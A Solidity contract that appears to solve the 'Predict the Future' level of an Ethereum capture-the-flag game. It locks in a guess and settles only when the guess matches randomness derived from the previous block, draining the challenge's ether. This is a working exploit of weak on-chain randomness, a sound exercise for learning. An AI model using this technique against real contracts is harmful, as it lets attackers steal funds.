pragma solidity ^0.4.21;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract PredictTheFutureSolution {
    uint8 constant theAnswer = 7;
    address private _levelAddress;

    function PredictTheFutureSolution(address levelAddress) public payable {
        //constructor(address levelAddress) public payable {
        require(msg.value == 1 ether);
        _levelAddress = levelAddress;
        // lock in any number from 0 to 9 (remainder of division for 10)
        IPredictTheFutureChallenge(levelAddress).lockInGuess.value(msg.value)(theAnswer);
    }

    function settle() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(answer == theAnswer);
        IPredictTheFutureChallenge(_levelAddress).settle();

        /* previous overcomplicated solution ;) 
        IPredictTheFutureChallenge(_levelAddress).settle();
        if (address(this).balance > 0) {
            return;
        }
        // the funds haven't been received, so spend all the gas and revert tx
        while (true) {
            this;
        }
        */
    }

    function() public payable {}
}
